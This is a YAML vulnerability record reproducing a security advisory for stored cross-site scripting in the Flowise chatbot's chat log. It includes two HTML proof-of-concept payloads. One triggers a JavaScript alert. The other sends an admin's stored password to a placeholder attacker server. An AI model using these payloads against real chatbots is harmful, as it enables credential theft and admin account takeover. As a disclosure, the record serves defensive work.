vulnerability_id: VCID-km88-jey7-ekhb
aliases:
  - GHSA-7r4h-vmj9-wg42
summary: |
  Flowise Stored XSS vulnerability through logs in chatbot
  ### Description
  In the chat log, tags like input and form are allowed. This makes a potential vulnerability where an attacker could inject malicious HTML into the log via prompts. When an admin views the log containing the malicious HTML, the attacker could steal the admin's credentials or sensitive information with stored Cross Site Scripting.

  ### PoC
  ```html
  <form>
    <input type="image" src="/assets/account-3i3qpYzs.png" width="800" height="400" formaction="javascript:alert('XSS!!!');" />
  </form>
  ```
  If the above HTML code is entered, a very large img gets injected into the log. When an admin clicks the generated img, it alerts ‘XSS!!!’. It means stored xss is able in the chatbot.
  ```html
  <form>
    <input type="image" src="/assets/account-3i3qpYzs.png" width="800" height="400" formaction="javascript:window.location.href='<YOUR_REQUESTBIN_SERVER>?passwd=' + encodeURIComponent(localStorage.getItem('password'));" />
  </form>
  ```
  So when an admin clicks the img that generated by above html code, it sends a request, including credentials, to the attacker's IP. If attacker steal admin’s token, attacker can login as the admin in the apps.

  ### Poc Video
  [poc](https://drive.google.com/file/d/1_3HwU0MxZ4HfJqpx2mOBjxf-WSCMM_4o/view?usp=sharing)

  ### Impact
  An attacker could hijack an admin account in published chatbot. This can allow attacker to view chat logs of other users and API keys.
severities:
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-7r4h-vmj9-wg42
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/FlowiseAI/Flowise
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise
  - score: '5.3'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7r4h-vmj9-wg42
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7r4h-vmj9-wg42
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7r4h-vmj9-wg42
weaknesses:
  - CWE-79
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/FlowiseAI/Flowise
    reference_type:
    reference_id:
  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-7r4h-vmj9-wg42
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-7r4h-vmj9-wg42
    reference_type:
    reference_id: GHSA-7r4h-vmj9-wg42
